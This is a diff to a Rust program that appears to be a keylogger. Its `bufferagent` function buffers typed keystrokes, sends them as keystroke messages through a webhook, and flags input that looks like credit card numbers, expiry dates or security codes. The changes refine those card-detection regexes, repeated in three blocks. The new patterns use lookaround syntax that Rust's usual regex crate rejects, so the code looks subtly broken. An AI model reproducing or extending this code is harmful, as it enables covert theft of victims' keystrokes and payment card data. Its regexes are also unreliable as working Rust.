@@ -137,11 +137,11 @@ fn bufferagent(element: char, buffer: &mut Vec<char>, timer: &mut Instant, webho
         // Flush the buffer to the file
         let output = format!("{} [ENTER]", &stringbuffer);
 
-        let cc = Regex::new(r"\d{16}").unwrap().is_match(&stringbuffer)
-            || Regex::new(r"\b\d{2}/\d{2}\b")
+        let cc = Regex::new(r"(?<!\d)\d{16}(?!\d)").unwrap().is_match(&stringbuffer)
+            || Regex::new(r"\b(0?[1-9]|1[0-2])/(0?[0-4][0-9]|50)\b")
                 .unwrap()
                 .is_match(&stringbuffer)
-            || Regex::new(r"\d{3}").unwrap().is_match(&stringbuffer);
+            || Regex::new(r"(?<!\d)\d{3,8}(?!\d)").unwrap().is_match(&stringbuffer);
 
         let params = &Params {
             msgtype: MessageTypes::Keystroke,
@@ -171,11 +171,11 @@ fn bufferagent(element: char, buffer: &mut Vec<char>, timer: &mut Instant, webho
             buffer.iter().collect::<String>().replace('\n', "\\n")
         );
 
-        let cc = Regex::new(r"\d{16}").unwrap().is_match(&stringbuffer)
-            || Regex::new(r"\b\d{2}/\d{2}\b")
+        let cc = Regex::new(r"(?<!\d)\d{16}(?!\d)").unwrap().is_match(&stringbuffer)
+            || Regex::new(r"\b(0?[1-9]|1[0-2])/(0?[0-4][0-9]|50)\b")
                 .unwrap()
                 .is_match(&stringbuffer)
-            || Regex::new(r"\d{3}").unwrap().is_match(&stringbuffer);
+            || Regex::new(r"(?<!\d)\d{3,8}(?!\d)").unwrap().is_match(&stringbuffer);
 
         let params = &Params {
             msgtype: MessageTypes::Keystroke,
@@ -205,11 +205,11 @@ fn bufferagent(element: char, buffer: &mut Vec<char>, timer: &mut Instant, webho
             buffer.iter().collect::<String>().replace('\n', "\\n")
         );
 
-        let cc = Regex::new(r"\d{16}").unwrap().is_match(&stringbuffer)
-            || Regex::new(r"\b\d{2}/\d{2}\b")
+        let cc = Regex::new(r"(?<!\d)\d{16}(?!\d)").unwrap().is_match(&stringbuffer)
+            || Regex::new(r"\b(0?[1-9]|1[0-2])/(0?[0-4][0-9]|50)\b")
                 .unwrap()
                 .is_match(&stringbuffer)
-            || Regex::new(r"\d{3}").unwrap().is_match(&stringbuffer);
+            || Regex::new(r"(?<!\d)\d{3,8}(?!\d)").unwrap().is_match(&stringbuffer);
 
         let params = &Params {
             msgtype: MessageTypes::Keystroke,
